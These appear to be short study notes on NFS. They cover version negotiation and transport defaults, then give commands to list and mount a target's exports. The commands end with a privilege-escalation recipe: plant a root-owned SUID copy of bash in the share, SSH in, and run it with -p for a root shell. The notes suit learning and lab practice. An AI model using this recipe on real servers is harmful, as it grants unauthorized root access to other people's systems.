Network File System is like mounting a device, except this device is connected through the network instead of physically.
https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html

Version 2 and 3 coexists. (well V4 also exists ^^')
If both client and server can use version 3, they do. Else they use version 2.
`-vers` can be used to force a specific version.

By default, it uses a connection-oriented protocal (e.g. TCP), cf `/etc/netconfig`. If none are supported by both client and server, UDP will be used.

The server checks the user has the permissions obviously.
Accessing a file is done through an RPC call, with file handle, name of the file, user ID and group ID.

```bash
# List FOLDER_TO_MOUNT
/usr/sbin/showmount -e TARGET_IP

# -t nfs = type of mount
# -nolock = do not use NLM locking
sudo mount -t nfs TARGET_IP:FOLDER_TO_MOUNT PATH_TO_LOCAL_FOLDER -nolock

# Escalation priviledge idea
# Send a file with SUID bit set (for example a specific /bin/bash)
# Then connect on the server and execute this executable.
cd PATH_INSIDE_NFS
cp /bin/bash .
sudo chown root ./bash
sudo chmod +s ./bash # also need executable
ssh TARGET_IP -i PATH_TO_id_rsa
./bash -p # -p to persists the permissions
```